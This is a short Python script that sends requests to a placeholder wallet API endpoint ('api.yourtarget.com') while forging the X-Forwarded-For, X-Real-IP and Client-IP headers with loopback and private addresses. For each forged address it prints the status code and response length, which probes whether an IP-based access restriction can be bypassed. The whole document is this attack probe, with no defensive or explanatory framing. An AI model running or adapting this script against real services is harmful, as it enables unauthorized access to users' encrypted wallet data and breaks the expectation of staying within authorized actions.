import requests

url = "https://api.yourtarget.com/wallets/v1/user/encrypted"
spoof_ips = ["127.0.0.1", "10.0.0.1", "192.168.1.1", "localhost"]

for ip in spoof_ips:
    headers = {
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Client-IP": ip
    }
    r = requests.get(url, headers=headers, timeout=4)
    print(f"IP {ip} -> Status: {r.status_code} | Len: {len(r.content)}")
